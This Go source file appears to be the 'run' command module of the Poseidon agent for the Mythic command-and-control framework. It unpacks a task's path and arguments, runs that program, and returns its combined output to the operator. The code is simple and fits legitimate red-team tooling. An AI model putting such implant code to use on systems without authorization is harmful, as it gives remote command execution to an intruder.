package run

import (
	// Standard
	"bytes"
	"encoding/json"
	"fmt"
	"os/exec"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type runArgs struct {
	Path string   `json:"path"`
	Args []string `json:"args"`
}

//Run - Function that executes the run command
func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID
	args := runArgs{}
	msg.TaskID = task.TaskID

	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters. Reason: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	} else {
		cmd := exec.Command(args.Path, args.Args...)
		var out bytes.Buffer
		cmd.Stdout = &out
		cmd.Stderr = &out
		if err := cmd.Run(); err != nil {
			msg.Status = "error"
			msg.Completed = true
			msg.UserOutput += "\n" + err.Error()
		} else {
			msg.Completed = true
			if out.String() == "" {
				msg.UserOutput = "Command processed (no output)."
			} else {
				msg.UserOutput = out.String()
			}
		}
		task.Job.SendResponses <- msg
		return
	}

}
